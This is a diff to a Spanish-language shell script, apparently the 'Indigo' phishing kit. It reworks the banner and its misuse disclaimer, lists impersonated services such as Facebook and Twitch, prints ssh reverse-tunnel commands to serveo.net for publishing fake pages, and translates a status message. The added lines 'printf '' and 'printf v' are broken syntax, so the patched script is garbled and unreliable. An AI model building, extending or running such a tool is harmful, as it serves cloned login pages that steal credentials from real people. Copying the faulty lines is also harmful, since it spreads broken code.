@@ -8,6 +8,7 @@ command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip no esta instalado ! insta
 banner() {
 clear
 
+
 printf "     \e[1;97m                               \n"   
 printf "    ╔═╗╔═╗╔══╗╔════╗╔═══╗╔═══╗╔══╗╔═══╗\n"
 printf "    ║║╚╝║║╚╣─╝║╔╗╔╗║║╔═╗║║╔═╗║╚╣─╝║╔═╗║\n"
@@ -15,8 +16,10 @@ printf "    ║╔╗╔╗║─║║─╚╝║║╚╝║║─║║║�
 printf "    ║║║║║║─║║───║║──║║─║║╚══╗║─║║─╚══╗║\n"
 printf "    ║║║║║║╔╣─╗──║║──║╚═╝║║╚═╝║╔╣─╗║╚═╝║\n"
 printf "    ╚╝╚╝╚╝╚══╝──╚╝──╚═══╝╚═══╝╚══╝╚═══╝v2.1\n" 
-printf "     \e[1;31m\e[0 No me hago cargo del mal uso que se le pueda dar a esta herramienta\e[1;31m \n"
-printf "     \e[1;97m\e[0                 indigo    \e[1;97m \n"
+printf "     \e[0m\e[1;31        Índigo \e[1;97m \n" 
+
+printf "     \e[1;31m\e[0m No me hago cargo del mal uso que se le pueda dar a esta herramienta\e[1;31m \n"
+
 }
 menu() {
 printf " \e[0m[\e[0m\e[0m01\e[0m\e[0m]\e[0m\e[0m Facebook    \e[0m\e[0m[\e[0m\e[0m11\e[0m\e[0m]\e[0m\e[0m Twitch      \e[0m\e[0m[\e[0m\e[0m21\e[0m\e[0m]\e[0m\e[0m DeviantArt\e[0m\n"
@@ -294,10 +297,10 @@ send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
 printf "\n"
 
 
-printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m N copia y pega esto en una nueva terminal: ssh -R 80:localhost:'$port' serveo.net \e[0m\e[0m %s \n' 
-
-
-printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Para poner un subdominio personalizado copia y cambia la palabra "indigo" por el subdominio que quieras: ssh -R indigo:80:localhost:'$port' serveo.net \e[0m\e[0m %s \n'
+printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m N copia y pega esto en una nueva terminal:   \e[1;97m  ssh -R 80:localhost:'$port' serveo.net \e[0m\e[0m %s \n' 
+printf '
+printf v
+printf ' \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Para poner un subdominio personalizado copia y cambia la palabra "indigo" por el subdominio que quieras:   \e[1;97m  ssh -R indigo:80:localhost:'$port' serveo.net \e[0m\e[0m %s \n'
 
 printf "\n"
 found
@@ -313,7 +316,7 @@ if [[ -e ngrok ]]; then
 echo ""
 else
 printf "\e[0m\n"
-printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Initializing...\e[0m\e[0m(\e[0m\e[0mlocalhost:5555\e[0m\e[0m)\e[0m\n"
+printf " \e[0m[\e[0m\e[0m~\e[0m\e[0m]\e[0m\e[0m Iniciando...\e[0m\e[0m(\e[0m\e[0mlocalhost:5555\e[0m\e[0m)\e[0m\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
